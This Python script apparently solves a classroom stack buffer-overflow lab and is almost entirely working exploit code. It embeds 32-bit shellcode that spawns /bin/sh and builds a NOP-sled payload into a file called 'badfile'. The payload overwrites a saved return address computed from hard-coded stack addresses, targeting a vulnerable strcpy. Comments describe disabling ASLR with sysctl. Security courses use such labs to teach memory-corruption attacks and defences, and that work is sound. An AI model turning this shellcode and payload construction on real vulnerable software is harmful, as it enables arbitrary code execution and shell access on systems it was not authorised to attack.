#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Important locations to consider
# Supposed to attack inside bof, line 20 at strcpy
# So it cannot be any of these that is the problem
# I triple checked
# EDIT: After running sudo sysctl -w kernel.randomize_va_space=0
# AGAIN, it works now. Did I mistype this four times?
ebp_var = 0xbfffe5b8
buffer_var = 0xbfffe54c
dist = ebp_var - buffer_var
# For sure need to know the buffer size. Change this here for
# each compilation.
buf_size = 300
# If the attack didn't work, make ret offset a little bigger.
ret_offset = 120

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = buf_size - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
# The ret offset doesn't really matter thanks to the nops,
# but the offset must still be >8
ret    = ebp_var + ret_offset
offset = dist + 4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
